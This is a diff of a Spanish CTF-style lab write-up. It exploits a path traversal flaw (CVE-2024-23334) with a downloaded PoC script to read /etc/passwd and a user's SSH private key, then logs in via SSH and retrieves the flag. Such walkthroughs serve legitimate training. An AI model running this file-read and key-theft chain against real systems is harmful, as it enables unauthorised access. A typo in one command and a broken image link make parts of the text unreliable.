@@ -173,12 +173,12 @@ Una vez descargado el exploit, se procedió a su ejecución para validar la vuln
 ```bash
 wget https://raw.githubusercontent.com/s4botai/CVE-2024-23334-PoC/refs/heads/main/lfi.sh
 chmod +x lfi.sh
-./lfi.sh -u http://10.10.10.2:5000/static/index.html -f /etc/passwd
+./lfi.sh -u http://10.10.10.2:5000/static/index.html -f /etc/passwdS
 ``` id="exploit-lfi"
 
----
 
-### 📌 Resultado
+<img width="964" height="507" alt="image" src="https://github.com/user-attachments/assets/b8bbcbd4-ba1b-415f-9feb-67f3f9c4ace6" />
+
 
 La explotación fue exitosa, permitiendo la lectura de archivos locales del sistema objetivo. Esto confirma:
 
@@ -187,5 +187,76 @@ La explotación fue exitosa, permitiendo la lectura de archivos locales del sist
 - Un punto de apoyo inicial para continuar con la intrusión  
 
 Este vector será clave para la obtención de credenciales y el posterior acceso al sistema a través de otros servicios como SSH.
+---
+
+### 🧨 Exfiltración de la clave privada
+
+Se utiliza el exploit previamente identificado para descargar la clave:
+
+```bash
+./lfi.sh -u http://10.10.10.2:5000/static/index.html -f /home/drzunder/.ssh/id_rsa
+``` id="lfi-key"
+
+![Extracción de clave privada](https://github.com/user-attachments/assets/20bea067-7061-4c4e-881f-65b8e2cbd3e7)
+
+La operación confirma que la clave privada es accesible, lo que representa un vector crítico de compromiso.
 
 ---
+
+### 🛠️ Preparación de la clave
+
+Una vez obtenida, se guarda localmente y se ajustan los permisos requeridos por SSH:
+
+```bash
+nano drzunder-id_rsa
+chmod 600 drzunder-id_rsa
+``` id="prep-ssh"
+
+---
+
+### 🚪 Acceso remoto vía SSH
+
+Se establece conexión con el sistema objetivo utilizando autenticación por clave:
+
+```bash
+ssh -i drzunder-id_rsa drzunder@10.10.10.2
+``` id="ssh-login"
+
+Durante la primera conexión, se acepta la huella del host remoto.
+
+---
+
+### ✅ Validación de acceso
+
+Una vez dentro, se verifica el contexto de ejecución:
+
+```bash
+whoami
+id
+hostname
+``` id="post-access"
+
+![Acceso SSH exitoso](https://github.com/user-attachments/assets/b6f1ac35-d7d2-4243-b1b5-dba87a78720f)
+
+---
+
+### 🚩 Obtención de la flag
+
+Tras el acceso, se identifica la presencia de la flag en el directorio personal del usuario **drzunder**, confirmando el compromiso exitoso del sistema.
+
+![Flag de usuario](https://github.com/user-attachments/assets/1019411a-b979-4)
+
+---
+
+### 📌 Conclusión
+
+La explotación de la vulnerabilidad permitió:
+
+- Acceder a archivos sensibles del sistema  
+- Exfiltrar la clave privada del usuario  
+- Autenticarse vía SSH sin credenciales tradicionales  
+- Obtener acceso interactivo al sistema  
+
+Este punto representa un **acceso inicial completo**, habilitando fases posteriores como enumeración interna y técnicas de pivoting.
+
+---033-85c0-3f8c7f89255a" />
